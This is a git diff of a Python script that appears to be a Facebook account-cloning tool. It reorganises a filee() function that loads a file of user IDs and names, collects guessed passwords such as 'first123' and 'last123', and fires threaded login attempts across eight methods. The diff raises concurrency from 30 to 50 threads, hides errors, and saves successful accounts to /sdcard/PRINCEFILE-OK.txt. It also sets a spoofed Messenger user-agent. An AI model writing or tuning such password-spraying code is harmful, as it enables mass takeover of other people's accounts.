@@ -352,63 +352,6 @@ def old():
 
 user_agent="Dalvik/2.1.0 (Linux; U; Android 8.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/483.0.0.16.537;FBPN/com.facebook.orca;FBLC/en_US;FBBV/346852117;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/8.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920)"
 
-def filee():
-    global oks, loop
-    pwx = []
-    sort.clear()
-    sort.logo()
-    print("[b]    [red1][✗] [chartreuse1][spring_green1]BD/IND FILE Clone")
-    print(sort.line())
-    print("[b] [chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] "
-          "/sdcard/id.txt")
-    path = str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
-    print(sort.line())
-    try:
-        with open(path, "r") as file:
-            fl = file.read().splitlines()
-    except Exception as e:
-        print("Error:", e)
-        filee()
-    limit = int(input(" \x1b[38;1;198m  \x1b[38;5;155m   Password Limit -> \x1b[38;5;196m⟩ \x1b[1;97m   "))
-    print(sort.line())
-    for i in range(limit):
-        print(
-            " [b] Π[chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
-        passw = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mAdd Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
-        if passw not in pwx:
-            pwx.append(passw)
-        print(sort.line())
-    print("  [r dark_olive_green1]N1 -> [/r dark_olive_green1][b violet] Method 1")
-    print("  [r dark_olive_green1]N2 -> [/r dark_olive_green1][b violet] Method 2")
-    print("  [r dark_olive_green1]N3 -> [/r dark_olive_green1][b violet] Method 3")
-    print("  [r dark_olive_green1]N4 -> [/r dark_olive_green1][b violet] Method 4")
-    print("  [r dark_olive_green1]N5 -> [/r dark_olive_green1][b violet] Method 5")
-    print("  [r dark_olive_green1]N6 -> [/r dark_olive_green1][b violet] Method 6")
-    print("  [r dark_olive_green1]N7 -> [/r dark_olive_green1][b violet] Method 7")
-    print("  [r dark_olive_green1]N8 -> [/r dark_olive_green1][b violet] Method 8")
-    print(sort.line())
-    meth = str(input("  \x1b[38;1;198mΠ\x1b[38;5;155mCHOICE  \x1b[38;5;196m⟩ \x1b[1;97m   "))
-    print(sort.line())
-    with ThreadPool(max_workers=30) as sub:
-        sort.clear()
-        print(sort.logo())
-        print(
-            f"  [r dark_sea_green1]Π![/r dark_sea_green1] [light_green]Total Pas[b red1]  ⟩ [/b red1]  [light_green] +{str(len(pwx))}")
-        print(sort.line())
-        try:
-            for xd in fl:
-                uid, name = xd.split("|")
-                sub.submit(file_sub, uid, pwx, name, meth, fl)
-
-        except:
-            pass
-    print("\r\r" + sort.line())
-    print(f"  Π! Total OK id : {str(len(oks))}")
-    print(f"  Π! Save  /sdcard/PRINCEFILE-OK.txt ")
-    print(sort.line())
-    sys.exit()
-
-
 def file_sub(uid, pwx, name, meth, fl):
     global oks, loop
     try:
@@ -522,9 +465,66 @@ def file_sub(uid, pwx, name, meth, fl):
             else:
                 continue
     except Exception as e:
-        print(e)
+        pass
     finally:
         loop += 1
+
+
+def filee():
+    global oks, loop
+    pwx = []
+    sort.clear()
+    sort.logo()
+    print("[b]    [red1]✗ [chartreuse1] [spring_green1]BD/IND FILE Clone")
+    print(sort.line())
+    print("[b] [chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] "
+          "/sdcard/id.txt")
+    path = str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
+    print(sort.line())
+    try:
+        with open(path, "r") as file:
+            fl = file.read().splitlines()
+    except Exception as e:
+        print("Error:", e)
+        filee()
+    limit = int(input("   [spring_green1]Password Limit -> "))
+    print(sort.line())
+    for i in range(limit):
+        print(
+            " [b] Π[chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
+        passw = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mAdd Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
+        if passw not in pwx:
+            pwx.append(passw)
+        print(sort.line())
+    print("  [r dark_olive_green1]Π1[/r dark_olive_green1][b violet] Method 1")
+    print("  [r dark_olive_green1]Π2[/r dark_olive_green1][b violet] Method 2")
+    print("  [r dark_olive_green1]Π3[/r dark_olive_green1][b violet] Method 3")
+    print("  [r dark_olive_green1]Π4[/r dark_olive_green1][b violet] Method 4")
+    print("  [r dark_olive_green1]Π5[/r dark_olive_green1][b violet] Method 5")
+    print("  [r dark_olive_green1]Π6[/r dark_olive_green1][b violet] Method 6")
+    print("  [r dark_olive_green1]Π7[/r dark_olive_green1][b violet] Method 7")
+    print("  [r dark_olive_green1]Π8[/r dark_olive_green1][b violet] Method 8")
+    print(sort.line())
+    meth = str(input("  \x1b[38;1;198mΠ\x1b[38;5;155mCHOICE  \x1b[38;5;196m⟩ \x1b[1;97m   "))
+    print(sort.line())
+    with ThreadPool(max_workers=50) as sub:
+        sort.clear()
+        print(sort.logo())
+        print(
+            f"  [r dark_sea_green1]Π![/r dark_sea_green1] [light_green]Total Pas[b red1]  ⟩ [/b red1]  [light_green] +{str(len(pwx))}")
+        print(sort.line())
+        try:
+            for xd in fl:
+                uid, name = xd.split("|")
+                sub.submit(file_sub, uid, pwx, name, meth, fl)
+
+        except:
+            pass
+    print("\r\r" + sort.line())
+    print(f"  Π! Total OK id : {str(len(oks))}")
+    print(f"  Π! Save  /sdcard/PRINCEFILE-OK.txt ")
+    print(sort.line())
+    sys.exit()
 
 
 def ran():
